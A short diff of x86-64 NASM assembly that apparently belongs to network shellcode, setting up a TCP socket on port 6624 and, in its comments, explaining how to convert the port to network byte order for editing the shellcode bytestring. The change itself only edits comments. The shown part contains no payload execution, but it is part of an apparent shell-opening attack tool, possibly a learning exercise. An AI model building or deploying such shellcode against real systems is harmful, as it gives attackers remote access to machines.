@@ -40,7 +40,7 @@ _start:
 	;  socket(AF_INET, SOCK_STREAM, 0)
 	xor rbx, rbx
 	; port needs to be in network byte order
-	; python -c  "import socket; hex(socket.htons([port number]))"
+	; python -c  "import socket; hex(socket.htons(6624))"
 	; GIVES:  0xe019, which is good for octal input in NASM file.
 	; however, 
 	; echo "ibase=10; obase=16; 6624" |bc
@@ -48,7 +48,7 @@ _start:
 	; which is the correct order for modifying the shellcode bytestring directly:
 	; ex:,
 	; 400082:	66 bb 19 e0          	mov    bx,0xe019 
-	mov word bx, 0xe019	; port
+	mov word bx, 0xe019	; port 6624
 	xor rax, rax
 	times 5 push rax
 	pop rcx
